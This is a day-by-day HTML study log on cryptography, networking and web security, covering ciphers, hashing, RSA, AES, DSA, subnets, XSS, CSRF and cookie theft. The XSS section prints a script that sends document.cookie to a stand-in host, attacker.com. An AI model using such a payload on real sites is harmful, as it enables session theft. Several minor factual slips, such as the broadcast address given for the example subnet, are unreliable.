<h1>This will be about Cryptography, Networking and Security</h1>

<h2>Day 1</h2>
<h3>Substitution Cipher</h3>
<h4>
-> Caesar Cipher(+3) --> A becomes D, B becomes E and so on.<br>

<h3>Morse Code</h3>
<h4>
-> Will change numbers letters into dots(.) and dashes(_).</h4>

<h2>Day 2</h2>
<h3>Hashing Algorithm</h3>
<h4>
Properties:<br>
-> pre-image resistance. <br>
-> should be fast but not so fast.<br>
-> shouldn't have hash collisions.<br>
-> avalanche effect. i.e. change in one bit changes the whole hash value.<br>

Types of Hashing Algorithms:<br>
-> SHA(Secure Hash Algorithms) -> various versions are there such as SHA-1, SHA-2, etc.<br> 
-> MD5(Message Digest 5) -> broken</h4>
<h4>SHA-1:<br>
-> 160 bits long hash values means 32 bits each for 5 message<br>
-> 160 bits is basically changed into group of 4 bits to get 32 length hash value.<br>
-> Bears similarity with MD5 and MD4 in functioning.</h4>
<h2>Day 3</h2>
<h3>Salting</h3>
<h4>A technique to add random values to your password to get different hash value.
<br>
i.e. <br><i></h4>
password = input("Enter your password: ")<br>
salt = some_random_value<br>
password = password + salt<br>
hashed_value = hash(password)<br>
</i>
<h4>
The password hash here will be different and help in securing your password as it won't be available now in the rainbow table.
</h4>

<h2> Day 4</h2>
<h3>IP addresses and their types</h3>
<h4>
Private:<br>

-> Only used in local networks such as home/office.<br>
-> There is range for the private IPs categorized into certain classes.<br>
1.  Class A: range from 10.0.0.0 to 10.255.255.255<br>
2.  Class B: range from 172.16.0.0 to 172.31.255.255<br>
3.  Class C: range from 192.168.0.0 to 192.168.255.255<br>

The above-mentioned are IPv4 IPs. For the IPv6, they will be mentioned as fc00::/7 will start with fc or fd.<br>

<i>To note:<br></i>
IPv4 uses <i>32</i> bit address.<br>
IPv6 uses <i>128</i> bit address.<br>

Public:<br>

-> Any IPs not in the range of above will be Public IPs.<br>
-> This is the IP with which you connect to the world.<br>
-> for example, Google public DNS server IP is 8.8.8.8.<br>

</h4>

<h3>Subnet</h3>
<h4>
-> It is a smaller, logically divided network within a larger network.<br>
-> created by using subnet mask such as 255.255.255.0 where this means first 24 bits are masked and only last 8 bits are used for host.<br>
-> To be clear say, our ip address is of form 192.168.1.0/24 then 192.168.1 part is network address while .0 part is host address.<br>
-> So, 192.168.1.0 is used for network address, 192.168.0.255 is used for broadcast address and remaining are used for devices on the network.<br>
-> Here, 255.255.255.0 is known as subnet mask.<br>
-> Also we can create more subnets as notation is to create two subnets. 192.168.1.0/25 to borrow one bit from the host address.<br>
</h4>

<h2>Day 5</h2>
<h3>Public Key Crytography(RSA)</h3>
<h4>
-> The keys are not same for encryption and decryption i.e. public key for encryption and private key for decryption but these keys are related to each other mathematically.<br>
</h4>
<h4>
How Does This Works?<br><br>

1. Key Generation:<br>
-> we choose two primes say p, q.<br>
-> we compute <i>n = p &times; q</i> this n will be used a part of both public and private key.<br>
-> we then compute the euler's totient function <i>&Phi;(n) = (p - 1) &times; (q - 1)</i>. This totient function means the total numbers which are coprime to n from 1 to n - 1.<br>
-> we select e(the public exponent) such that <i> 1 < e < &Phi;(n)</i> and e is coprime to &Phi;(n) i.e. <i> gcd(e, &Phi;(n)) = 1</i>.<br>
-> we calculate d(the private component) as the modular inverse of e modulo &Phi;(n), so that <i>d &times; e &equiv; 1 mod &Phi;(n).</i><br>
<br>

2. Encryption:<br>
-> sender uses the recipient's public key(e, n) to encrypt the plaintext M into ciphertext C using the formula: <i>C = M<sup>e</sup> mod n.</i><br>
<br>

3. Decryption:<br>
-> receiver uses the private key(d, n) to decrypt the Ciphertext C into Message M using the formula: <i> M = C<sup>d</sup> mod n</i>.<br>


Here, larger the primes p and q, harder it is to break the encryption.
</h4>

<h2>Day 6</h2>
<h3>Advanced Encryption Standard (AES)</h3>
<h4>
-> Symmetric Encryption Standard which encrypts data in fixed-size blocks(128 bits)<br>
-> Supports key size of 128, 192, 256 bits.<br>
-> highly secure and used by U.S. NIST.<br>
-> performs series of transformation over multiple rounds depending on the key size:<br>
    . AES-128: 10 rounds<br>
    . AES-192: 12 rounds<br>
    . AES-256: 14 rounds<br>
</h4>

<h3>Data Encryption Standard (DES)</h3>
<h4>It is a block cipher that operates on 64-bits blocks using a 56-bit key. It is a symmetric-key algorithm.</h4>
<h4>
->  performs 16 round of operations.<br>
->  unsecure and is prone to brute force attack due to 56-bit key.<br>
</h4>

<h3>Digital Signature Algorithm (DSA)</h3>
<h4>It is an asymmetric algorithm for digital signature. It is the part of Digital Signature Algorithm standard in the Digital Signature Standard(DDS).</h4>
<h4>
->  private key for signing and public key for verification.<br>
->  typically uses 1024 bits but 2048 and 3072 bits are preferred for better security.<br>
->  generates Digital Signature for a message using the private key.
</h4>

<h4>DSA Signature Generation</h4>
<h4>

1. Message Hashing: It is done using any hashing algorithms such as SHA-1 or SHA-256. This hash value is denoted by <i>H(m)</i>.


2. Signature Generation: Select a random integer <i>k</i> (from a range([1, q - 1] where q is small prime divisor of p - 1.) determined by the parameters of DSA).<br><br>
    Calculate <i>r</i> and <i>s</i> as:<br>
    <i> r = (g<sup>k</sup> mod p) mod q</i> (where g, p, q are the DSA parameters).<br>
    <i> s = k<sup>-1</sup>(H(m) + xr) mod q </i>(where x is the private key and k<sup>-1</sup> is the modular inverse of k and calculated using the Extended Euclidean Algorithm).<br>
    

3. The pair (r, s) is the signature pair. Note that both r and s must be within the range of [1, q - 1]. If not, it is considered invalid.
</h4>
<h4> DSA Signature Verification</h4>
<h4>


1. Compute w.<br>
   <i>w = s<sup>-1</sup> mod q.</i>


2. Computer u1 and u2.<br>
<i>u1 = (H(m) &times; w) mod q</i><br>
<i>u2 = (r &times; w) mod q</i>


3. Compute v using public key y and domain parameters p, q, g and u1 and u2.<br>
<i>v = (g<sup>u1</sup> &times; y<sup>u2</sup>) mod p mod q.</i>


4. Verify:<br>
 if <i>v = r</i>, valid else invalid.
</h4>


<h2>Day 7</h2>
<h3>Cross Site Scripting (XSS)</h3>
<h4>It is a vulnerability that allows an attacker to inject malicious scripts (basically Javascript) into the content viewed by the users.
The injected script can execute in the context of the victim’s browser, allowing the attacker to steal information (such as cookies or session tokens), manipulate content, or perform other malicious actions.
</h4>

<h4>Types of XSS</h4>
<h4>

1.  Stored XSS: It is stored permanently stored on Target's server(i.e. Database)


2.  Reflected XSS: The malicious script is reflected off a web server, typically through URL parameters, and executes when the victim clicks on a crafted URL.


3.  DOM-based XSS: The vulnerability exists in the client-side code (JavaScript), where the page itself executes the malicious script without proper sanitization.
</h4>


<h3>Cross Site Forgery Request (CSFR)</h3>
<h4>It is an attack where an attacker tricks a victim into performing an unwanted action on a web application in which the victim is authenticated. The attacker typically sends a request from the victim's browser to a website where the victim is logged in, exploiting the trust that the site has in the user's browser.</h4>

<h4>How CSRF Works:

->  The attacker sends a link or embeds malicious code (usually in an email, on a website, or in a forum post).<br>

->  If the victim is logged into a vulnerable web application, clicking the link or executing the code sends an unintended request to the server, potentially performing actions like transferring funds, changing account settings, or making posts.
</h4>

<h2>Day 8 </h2>
<h3>Cookies</h3>
<h4>Cookies are small pieces of data that are stored on your browser or device by websites. They are used to remember information about you and your interactions with a website over time.<br>
Think of cookies as little notepads that websites use to store information about your visit and user preferences, making your experience more convenient and personalized.</h4>

<h4>Types of Cookies</h4>

<h4>1.  Session Cookies</h4>
<h4>
<strong>Purpose:</strong> These cookies are temporary and are erased when you close your browser. They store temporary information like whether you're logged in or not while you're actively using the website.<br>
<strong>Example:</strong> When you log in to a site, the session cookie keeps you logged in for as long as you browse. Once you close the browser, it disappears.
</h4>

<h4>2.  Persistent Cookies</h4>
<h4>
<strong>Purpose:</strong> These cookies stay on your device even after you close the browser. They have an expiration date (a set amount of time), and they allow websites to remember things like login details, preferences, and settings across multiple sessions.<br>
<strong>Example:</strong> When you visit a website, and it "remembers" your login info (so you don't have to re-enter it every time), that's a persistent cookie at work.
</h4>

<h4>3.  First-Party Cookies</h4>
<h4>
<strong>Purpose:</strong> These are cookies set by the website you are currently visiting.<br>
<strong>Example:</strong> If you visit example.com, and example.com sets a cookie, that cookie is considered a first-party cookie.
</h4>

<h4>4.  Third-Party Cookies</h4>
<h4>
<strong>Purpose:</strong> These are cookies set by external services that are not part of the website you're visiting. They are commonly used for tracking across multiple sites for advertising purposes.<br>
<strong>Example:</strong> When you visit a website that has an embedded ad or a social media widget (like a "Like" button from Facebook), Facebook may set a cookie to track you across the web for targeted ads.
</h4>

<h3> Session Hijacking and Cookie Stealing</h3>
<h4>1.  Man-in-the-Middle (MITM) Attack</h4>
<h4>
In a MITM attack, the attacker intercepts the communication between the client and server. If the connection is not secure (HTTP instead of HTTPS), the attacker can capture the session cookie sent by the browser.
</h4>

<h4>Example of a MITM Attack:</h4>
<h4>
1. The victim visits example.com over HTTP.<br>
2. The attacker, positioned between the victim and the server (e.g., on an untrusted Wi-Fi network), intercepts the communication.<br>
3. The attacker captures the session cookie sent by the server in the HTTP response.<br>
4. The attacker now uses the stolen session cookie to impersonate the victim.
</h4>

<h4>Mitigation:</h4>
<h4>
• Always use HTTPS (encrypted communication) to ensure cookies are transmitted securely.<br>
• Ensure Secure flags are set on cookies to prevent cookies from being sent over non-HTTPS connections.
</h4>

<h4>2.  Cross-Site Scripting (XSS)</h4>
<h4>
XSS occurs when an attacker injects malicious JavaScript into a webpage, which is then executed in the victim’s browser. If the target site does not set the HttpOnly flag on cookies, the attacker can access cookies via JavaScript.
</h4>

<h4>Example of XSS Attack:</h4>
<h4>
1. The attacker finds a vulnerability (e.g., a comment form or search bar) on the target website where user input is not sanitized.<br>
2. The attacker submits a script like this:
</h4>
<pre><code>
&lt;script&gt;
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
&lt;/script&gt;
</code></pre>
<h4>
3. When a victim views the page with the malicious script, the script sends the victim’s cookies to the attacker’s server.
</h4>

<h4>Mitigation:</h4>
<h4>
• Always use the HttpOnly flag on cookies, which prevents JavaScript from accessing them.<br>
• Validate and sanitize all user inputs to prevent XSS.
</h4>

<h4>3.  Session Fixation Attack</h4>
<h4>
A session fixation attack occurs when an attacker forces a user to use a specific session ID, which the attacker has already set. When the victim logs in with that session ID, the attacker can use it to hijack the session.
</h4>

<h4>Example of Session Fixation:</h4>
<h4>
1. The attacker creates a session on the server, which gives them a session ID (123456).<br>
2. The attacker tricks the victim into clicking a link that forces them to use this session ID (e.g., by appending ?sessionid=123456 to the URL).<br>
3. The victim logs in, and the server now associates their account with the attacker’s session ID.<br>
4. The attacker can now use the same session ID to access the victim's account.
</h4>

<h4>Mitigation:</h4>
<h4>
• Regenerate session IDs upon login to prevent attackers from using pre-set session IDs.<br>
• Use Secure and SameSite flags to mitigate attacks.
</h4>
